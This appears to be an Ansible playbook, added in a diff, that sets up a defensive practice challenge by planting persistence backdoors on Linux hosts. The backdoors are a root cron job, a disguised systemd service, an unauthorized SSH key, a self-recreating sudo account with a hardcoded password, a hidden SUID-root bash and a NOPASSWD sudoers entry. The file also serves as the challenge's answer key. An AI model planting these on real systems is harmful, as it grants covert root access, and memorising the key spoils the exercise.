@@ -1,0 +1,125 @@
+---
+# DO NOT READ THIS FILE BEFORE ATTEMPTING THE CHALLENGE
+- name: Plant persistence mechanisms for CCDC practice
+  hosts: all
+  become: yes
+  tasks:
+    - name: Update apt cache
+      apt:
+        update_cache: yes
+
+    - name: Install Apache (legitimate business service)
+      apt:
+        name: apache2
+        state: present
+
+    - name: Ensure Apache is running and enabled
+      service:
+        name: apache2
+        state: started
+        enabled: yes
+
+    # --- 1. Unauthorized root cron job ---
+    - name: Plant unauthorized root cron job
+      cron:
+        name: "system cache sync"
+        user: root
+        minute: "*"
+        job: "/usr/bin/id >> /tmp/.svc-cache 2>&1"
+
+    # --- 2. Rogue systemd service, disguised name, enabled at boot ---
+    - name: Drop rogue service payload script
+      copy:
+        dest: /usr/local/lib/systemd-networkd-helper.sh
+        mode: "0755"
+        content: |
+          #!/bin/bash
+          while true; do
+              echo "$(date +%s) checkin" >> /var/log/.svc-helper
+              sleep 5
+          done
+
+    - name: Install rogue systemd unit
+      copy:
+        dest: /etc/systemd/system/systemd-networkd-helper.service
+        mode: "0644"
+        content: |
+          [Unit]
+          Description=Network Helper Daemon
+
+          [Service]
+          ExecStart=/usr/local/lib/systemd-networkd-helper.sh
+          Restart=always
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Enable and start rogue systemd service
+      systemd:
+        name: systemd-networkd-helper.service
+        daemon_reload: yes
+        enabled: yes
+        state: started
+
+    # --- 3. SSH authorized_keys backdoor ---
+    - name: Ensure vagrant user's .ssh directory exists
+      file:
+        path: /home/vagrant/.ssh
+        state: directory
+        owner: vagrant
+        group: vagrant
+        mode: "0700"
+
+    - name: Plant unauthorized SSH key for vagrant user
+      lineinfile:
+        path: /home/vagrant/.ssh/authorized_keys
+        line: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxL3Y8tRk2qQeW1JmzVvKZ0aB7cD4eF6gH8iJ0kL2mN svc-maint@corp"
+        create: yes
+        owner: vagrant
+        group: vagrant
+        mode: "0600"
+
+    # --- 4. Self-healing rogue user ---
+    - name: Create the backdoor account (already present at the start of the challenge)
+      user:
+        name: svc-tools
+        shell: /bin/bash
+        groups: sudo
+        append: yes
+
+    - name: Set backdoor account password
+      shell: echo "svc-tools:C4che!2024" | chpasswd
+
+    - name: Plant self-healing profile.d script that recreates svc-tools if deleted
+      copy:
+        dest: /etc/profile.d/99-cache-check.sh
+        mode: "0755"
+        content: |
+          #!/bin/bash
+          if ! id svc-tools &>/dev/null; then
+              useradd -m -s /bin/bash -G sudo svc-tools 2>/dev/null
+              echo 'svc-tools:C4che!2024' | chpasswd 2>/dev/null
+          fi
+
+    # --- 5. SUID-root shell backdoor ---
+    - name: Plant SUID-root shell binary
+      copy:
+        src: /bin/bash
+        dest: /usr/local/bin/.sysbash
+        remote_src: yes
+        owner: root
+        group: root
+        mode: "4755"
+
+    # --- 6. Rogue NOPASSWD sudoers entry ---
+    - name: Create low-privilege service account
+      user:
+        name: reports
+        shell: /bin/bash
+
+    - name: Grant unauthorized NOPASSWD sudo to reports
+      copy:
+        dest: /etc/sudoers.d/90-reports
+        mode: "0440"
+        content: "reports ALL=(ALL) NOPASSWD:ALL\n"
+        validate: "visudo -cf %s"
